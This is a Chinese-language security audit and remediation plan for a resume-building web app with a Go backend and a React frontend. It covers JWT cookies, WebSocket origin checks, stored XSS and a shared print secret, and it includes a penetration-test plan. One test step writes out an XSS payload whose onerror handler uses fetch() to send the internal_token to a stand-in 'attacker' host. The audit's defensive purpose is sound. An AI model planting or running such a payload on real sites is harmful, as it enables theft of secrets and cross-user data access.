【分析问题】

- 我已系统检索并梳理后端与前端关于认证、授权、文件与生成流程的实现，并定位潜在风险点与改进空间。关键代码位置以 `file_path:line_number` 标注。

**整体综述**
- 口令哈希：后端使用 `bcrypt.DefaultCost` 生成哈希，符合行业标准 `backend/internal/auth/auth_service.go:63-69`。
- 令牌模型：RS256 JWT，区分 `access` 与 `refresh`，刷新令牌带 `jti`，支持黑名单旋转 `backend/internal/auth/auth_service.go:76-113`、`backend/internal/api/auth_handler.go:160-210`。
- 会话载体：访问令牌保存在前端内存（`AuthContext`），刷新令牌以 `HttpOnly` Cookie 下发 `backend/internal/api/auth_handler.go:264-278`，前端使用 `credentials: "include"` 参与刷新与登出 `frontend/context/AuthContext.tsx:41-76`、`frontend/app/login/page.tsx:37-58`。
- 授权中间件：所有编辑/资产/模板 API 均使用 Bearer 访问令牌校验，并在服务端按 `user_id` 做严格隔离 `backend/internal/api/middleware/auth_middleware.go:13-46`、`backend/internal/api/resume_handler.go:147-177, 335-401, 428-462`、`backend/internal/api/template_handler.go:152-181, 183-220`。
- WebSocket：连接后需先发一条 `{"type":"auth","token":<accessToken>}` 完成鉴权；服务端 `CheckOrigin: true`（不限制源）且未强制校验 `TokenType=="access"` `backend/internal/api/ws_handler.go:25-39, 86-149`。
- 打印与 Worker：Worker 用 `INTERNAL_API_SECRET` 在前端打开 `/print/:id?internal_token=...`，前端 `PrintView` 再用该 token 拉取后端内部打印 JSON `backend/internal/worker/pdf_handler.go:129-155`、`frontend/components/PrintView.tsx:72-85`、`frontend/lib/api-routes.ts:58-69`、`backend/internal/api/resume_handler.go:463-511`、`backend/internal/api/template_handler.go:274-320`。
- 资产上传：使用 ClamAV 流式扫描后入库 MinIO，列表与预览 URL走预签名，访问前缀按用户隔离 `backend/internal/api/asset_handler.go:28-41, 46-95, 124-171`。
- 代理层：Nginx 统一同源反代 `/api/*` 到后端、支持 WebSocket；未显式配置 CORS 头 `deploy/nginx/nginx.conf:33-73`。

**注册/登录环节**
- 加密算法：口令哈希用 `bcrypt`，符合要求 `backend/internal/auth/auth_service.go:63-69`。
- 会话管理与 CSRF：
  - 刷新令牌通过 `HttpOnly` Cookie 下发，`secure` 取决于请求是否 HTTPS 代理 `backend/internal/api/auth_handler.go:264-278`。
  - 未设置 `SameSite` 属性（Gin 需显式设置 SameSite），理论上存在跨站环境下的刷新口令 CSRF 触发风险（攻击者可触发旋转但难以读取响应体，CORS 默认阻止读响应）。
  - 登录与登出接口均需 Bearer 令牌（登出在路由组里带 `authMiddleware`），CSRF 可行性低 `backend/internal/api/routes.go:31-41`、`frontend/app/page.tsx:618-639`。
- 密码重置流程：仓库未实现密码重置端到端流程（找回入口与邮件/令牌逻辑均缺失）。

**编辑简历环节**
- 用户隔离：所有用户简历 CRUD 在查询阶段都按 `WHERE id = ? AND user_id = ?` 严格限制资源归属，避免水平越权 `backend/internal/api/resume_handler.go:496-511, 512-527`。
- 垂直越权：项目中未见角色与管理端功能，不存在显式纵向权限面。
- API 认证：编辑相关端点全部挂载 `authMiddleware` 验证访问令牌 `backend/internal/api/routes.go:52-67`。
- XSS 风险（重要）：文本项以 `dangerouslySetInnerHTML` 渲染用户生成 HTML（编辑器页面与打印视图均如此），未做任何白名单/消毒，存在存储型 XSS 高风险
  - `frontend/components/TextItem.tsx:139-147`（只读渲染）
  - `frontend/components/SectionTitleItem.tsx:97-105`（组合组件内透传 TextItem）
  - 打印视图也直接渲染该 HTML `frontend/components/PrintView.tsx:203-211`
  - 一旦注入脚本，运行环境是前端页面上下文，能读 `window.location.search` 中的 `internal_token` 并外传，进而访问后端内部打印接口获取任何用户的简历/模板内容（参见打印环节分析）。

**文件操作环节**
- 目录遍历：资产 key 由服务端生成 `user-assets/<uid>/<uuid>.png`，获取预签名 URL 时只允许该用户前缀，路径遍历在对象存储语义下不可达（但前缀校验仍建议排除 `..` 段）`backend/internal/api/asset_handler.go:124-171`。
- 文件类型检查：上传未做强制类型/尺寸校验，仅依赖 ClamAV；对象名强制 `.png` 扩展与实际类型可能不一致 `backend/internal/api/asset_handler.go:68-86`。
- 存储权限：MinIO 使用预签名短时访问，后端按用户前缀管理，权限设置合理 `backend/internal/api/asset_handler.go:146-171`。

**PDF生成环节**
- 会话验证：用户发起 `GET /v1/resume/:id/download` 需访问令牌，队列任务入队 `backend/internal/api/resume_handler.go:361-401`。
- 未授权访问他人 PDF：用户最终获取下载链接前需 `GetDownloadLink` 再次按 `user_id` 检查，链接为其名下对象 `generated-resumes/<uid>/<uuid>.pdf`，不会泄露他人数据 `backend/internal/api/resume_handler.go:428-462`。
- 内部打印数据与队列控制：
  - 内部打印接口完全依赖单一共享密钥 `INTERNAL_API_SECRET` 校验；任何持有该密钥的客户端可读取任意 `id` 的打印 JSON `backend/internal/api/resume_handler.go:463-479, 500-511`、`backend/internal/api/template_handler.go:274-320`。
  - 前端 `PrintView` 将 `internal_token` 暴露于查询参数并在浏览器环境中使用，结合上述 XSS 风险，密钥泄露后可横向读取全部用户的打印数据与资产（图片已按归属限制——但攻击者能逐个枚举 resume id）。
  - Worker 启动 Chromium `NoSandbox` 运行（容器内），从前端页面渲染导出；若页面存在注入，脚本运行于无同源限制的前端上下文。

**渗透测试方案**
- 口令与登录
  - 弱口令与暴力尝试，观察是否有频率限制与锁定策略；用同一 IP 对 `/v1/auth/login` 连续失败 100 次，评估响应行为与日志指标。
  - JWT 造假与算法降级：构造 `alg=none` 或 HMAC 伪造令牌，验证服务端是否严格限制 RS256 `backend/internal/auth/auth_service.go:121-131`。
- CSRF 与 Cookie
  - 同源站点 + 跨站模拟 POST `/v1/auth/refresh`（附带 Cookie），验证是否能成功旋转刷新令牌；检查浏览器能否读取响应（CORS 应阻止读取，但状态改变应记录）。
  - 验证 Cookie 是否带 `Secure`（HTTPS 反代时为真）与 `SameSite`（当前未设置，浏览器默认值不一致），建议抓包确认。
- 授权隔离与 IDOR
  - 以用户 A/B 两个账号交替访问 `/v1/resume/:id`、`/v1/templates/:id`，确保非 owner 无法读取私有数据、公开模板可读 `backend/internal/api/resume_handler.go:496-511`、`backend/internal/api/template_handler.go:183-220`。
  - 尝试绕过列表过滤（如 `/v1/assets/view?key=user-assets/<otherId>/...`），验证前缀限制 `backend/internal/api/asset_handler.go:146-171`。
- WebSocket
  - 从第三方域直接连接 `/v1/ws` 并发送 `auth` 消息，确认服务端允许跨源升级（`CheckOrigin: true`）并完成鉴权；同时传入刷新令牌（若能获取），测试服务端是否拒绝 `refresh` Token（当前未校验 token_type）。
- XSS 与打印密钥泄露（重点）
  - 在文本块中存储 HTML 注入 payload，例如 `<img src=x onerror="fetch('https://attacker/steal?token='+new URLSearchParams(location.search).get('internal_token'))">`，在打印视图触发后端内部 JSON 拉取前验证是否外传密钥。
  - 验证 `dangerouslySetInnerHTML` 渲染点：编辑器只读呈现与打印视图（见文件位置上文），分别在用户界面与 Worker 渲染过程中观察脚本执行。
- 文件上传
  - 上传非图像大文件（例如 `application/pdf` 或 `zip`），观察是否被接收并以 `.png` 扩展存储；随后拉取预签名 URL，确认浏览器行为与后端 `Content-Type` 取值。
  - 流式病毒扫描绕过尝试（分片/畸形流），观察 ClamAV 行为与错误处理。

**可能的攻击向量**
- 刷新令牌 CSRF 触发（中危）：跨站 POST 触发刷新与令牌旋转，尽管读响应被 CORS 阻止，但可造成会话状态不可预期。
- 存储型 XSS（高危）：未消毒的用户 HTML 在编辑器与打印视图执行，从而读取 `internal_token` 并扩散至攻击者端。
- 内部打印密钥泄露（高危）：一旦泄露，共享密钥可被用于枚举、读取其他用户打印 JSON。
- WebSocket 跨源劫持辅助通道（中危）：不限制 `Origin` 且未强制 `access` 类型令牌，配合 XSS 或令牌泄露可被用作数据通道。
- 文件类型伪装（中危）：扩展与类型不一致，可能被浏览器错误处理或引入后续链路风险（尽管图片展示组件仅以 `<img>` 使用）。
- 认证暴力尝试（中危）：未见登录频率限制与锁定策略。

**安全加固建议**
- Cookie/CSRF
  - 为刷新令牌设置 `SameSite=Strict` 或至少 `Lax`，并在 Gin 设置 `c.SetSameSite(...)`；仅在 HTTPS 下设置 `Secure`（当前通过 `X-Forwarded-Proto` 判断）`backend/internal/api/auth_handler.go:303-311`。
  - 将刷新接口改为双提交 Cookie 或增加 CSRF Token 校验（仅对依赖 Cookie 的接口开启），或迁移刷新到 Authorization 承载（前端仍走 `credentials: include` 但必须带 CSRF 头）。
- XSS 与内容消毒（高优先）
  - 前端写入与渲染统一引入 HTML 白名单消毒（如 `dompurify` 且启用 `SAFE_URL` 规则），禁止 `on*` 属性与 `javascript:` URI，保留必要的块级/内联样式。
  - 渲染端替换 `dangerouslySetInnerHTML` 为仅支持可控标签的虚拟节点输出，或在进入 `Lexical` 前对外部 HTML统一消毒 `frontend/components/TextItem.tsx:44-63, 139-147`、`frontend/components/PrintView.tsx:203-211`。
- 内部打印密钥与架构改造（高优先）
  - 将共享的 `INTERNAL_API_SECRET` 改为“任务级一次性短期令牌”（每次入队生成、仅 Worker 与后端交互，5 分钟有效、单次可用）；避免在浏览器环境暴露。
  - 改造打印数据拉取路径：Worker 直接请求后端内部 JSON，再“注入数据”到前端页面（通过 Rod 的 `page.Eval` 设置 `window.__PRINT_DATA__`），而不让前端页面再调用后端（彻底移除 `internal_token` 在浏览器）。
  - 或者将打印渲染改为后端直出（服务端 HTML/CSS 渲染）后 PDF 导出，避免浏览器侧数据拉取。
- WebSocket
  - `CheckOrigin` 收紧到受信源（生产域）；在鉴权阶段强制 `claims.TokenType == "access"`。
- 认证防爆破
  - 登录接口添加速率限制（IP+账户名组合）与渐进式延时；失败计数超阈值短暂锁定；在日志与 Prometheus 指标暴露告警。
- 文件上传防护
  - 强制图像 MIME 白名单（`image/png|image/jpeg|image/webp`），校验 “扩展↔类型” 一致；设置大小上限（Nginx 已 10MB，可在应用层再控 5MB）。
  - 对 `GetAssetURL` 做 key 进一步校验：禁止 `..` 段与空字节、控制字符。

**权限与认证流程图**
```text
[User] -- POST /v1/auth/login --> [API] bcrypt校验 → 生成RS256 access/refresh
        <-- JSON(access)       [API] Set-Cookie(HttpOnly refresh, Secure?, SameSite? 未设)

[User] -- 自动刷新 /v1/auth/refresh + Cookie --> [API] 校验refresh(jti、黑名单)
        <-- JSON(new access) & Set-Cookie(new refresh)

[User] -- Bearer access --> /v1/resume|/v1/assets|/v1/templates (authMiddleware)
        后端基于 user_id 做资源隔离 (WHERE id=? AND user_id=?)

下载PDF：
[User] -- GET /v1/resume/:id/download (Bearer) --> [API] enqueue asynq
[Worker] -- rod -> open FRONTEND /print/:id?internal_token=SECRET
[FRONTEND PrintView] -- GET /v1/resume/print/:id?internal_token=SECRET --> [API] 返回打印JSON
[Worker] 渲染→导出PDF→上传MinIO (generated-resumes/<uid>/<uuid>.pdf)
[User] websocket通知 + GET /v1/resume/:id/download-link (Bearer) → 预签名URL

资产：
[User] -- POST /v1/assets/upload (Bearer) → ClamAV扫描→MinIO user-assets/<uid>/<uuid>.png
[User] -- GET /v1/assets/view?key=user-assets/<uid>/... (Bearer,prefix校验) → 15min预签名
```

**威胁模型（STRIDE 抽象）**
- Spoofing：伪造 JWT（受 RS256 限制，风险低）；WebSocket跨源滥用（需令牌）。
- Tampering：刷新令牌 CSRF 触发会话状态修改（有限影响）。
- Repudiation：缺少登录失败速率限制与审计字段；建议增强日志与报警。
- Information Disclosure：存储型 XSS → 泄露 `internal_token`；内部打印接口泄露所有用户内容。
- Denial of Service：无速率限制的登录/生成任务可能被滥用触发队列压力。
- Elevation of Privilege：无角色层级；主要风险在拥有共享密钥后绕过用户隔离读取打印数据。

**修复优先级评估**
- 高危
  - 在所有富文本渲染入口引入 HTML 消毒，移除 `dangerouslySetInnerHTML` 或包裹白名单渲染（编辑器与打印视图）。
  - 移除浏览器侧的 `internal_token` 使用；改为任务级一次性令牌 + Worker 直取后端数据。
- 中危 [已完成]
  - 刷新 Cookie 设置 `SameSite=Lax` 与 `Secure`（HTTPS 时），并对 `/v1/auth/refresh` 实施 CSRF 保护：`backend/internal/api/auth_handler.go:237-311, 318-336`。
  - WebSocket 仅允许受信源并强制 `TokenType == "access"`：`backend/internal/api/ws_handler.go:22-57, 114-155`。
  - 登录接口限流与锁定策略：`backend/internal/api/auth_handler.go:116-148, 150-188`；生成任务与上传频率控制：`backend/internal/api/resume_handler.go:361-401`、`backend/internal/api/asset_handler.go:96-141`。
  - 文件上传 MIME 白名单与体积上限、扩展一致性校验：`backend/internal/api/asset_handler.go:68-141`。
- 低危 [已完成]
  - `GetAssetURL` key 额外校验（禁止 `..` 与控制字符），统一校验函数：`backend/internal/api/asset_key_validation.go:1-29`，接口使用：`backend/internal/api/asset_handler.go:198-226`。
  - 统一内部打印接口鉴权逻辑抽象为中间件：`backend/internal/api/middleware/internal_secret.go:1-26`，路由应用：`backend/internal/api/routes.go:75-76`。
  - 为刷新 Cookie 显式设置 `Domain`（生产多子域）、删除对齐过期与域：`backend/internal/api/auth_handler.go:281-290, 311-323, 357`；配置项 `API_COOKIE_DOMAIN`：`backend/internal/config/config.go:167-210, 303-331`，示例 `.env.example`：`backend/.env.example:60-66`。

【制定方案】

- 变更文件与要点
  - `frontend/components/TextItem.tsx`、`frontend/components/PrintView.tsx`、`frontend/components/SectionTitleItem.tsx`：引入 HTML 白名单消毒模块（如 `dompurify`），在赋值与渲染前统一消毒，彻底移除通用 `dangerouslySetInnerHTML` 或包裹在安全输出组件中。
  - `backend/internal/api/auth_handler.go`：为刷新 Cookie 设置 `SameSite`（`Strict|Lax`），保持 `Secure` 判定；考虑在 `/v1/auth/refresh` 引入 CSRF 校验（如双提交 Cookie）。
  - `backend/internal/api/ws_handler.go`：`CheckOrigin` 改为受信域校验，鉴权阶段强制 `TokenType == "access"`。
  - `backend/internal/api/asset_handler.go`：上传 MIME 白名单与大小上限；`GetAssetURL` key 做额外字符校验。
  - 打印链路改造：
    - 后端：新增“任务级一次性令牌”生成与验证逻辑（短时有效、单次使用），移除共享 `INTERNAL_API_SECRET` 对浏览器暴露。
    - Worker：渲染前直接请求后端打印 JSON；通过 Rod 注入数据到前端页面（避免页面发起内部数据请求）。
    - `frontend/components/PrintView.tsx`：改为读取 `window.__PRINT_DATA__`（注入数据），移除对 `API_ROUTES.PRINT.*` 的调用。
  - 登录与任务速率限制：在 API 层引入限流中间件（基于 IP+用户名），Prometheus 指标联动报警。

- DRY 消除重复逻辑
  - 内部打印接口的 `internal_token` 校验已在两个处理器中重复（简历/模板）；统一抽象为中间件或复用函数，改造后改为“一次性令牌”中间件。
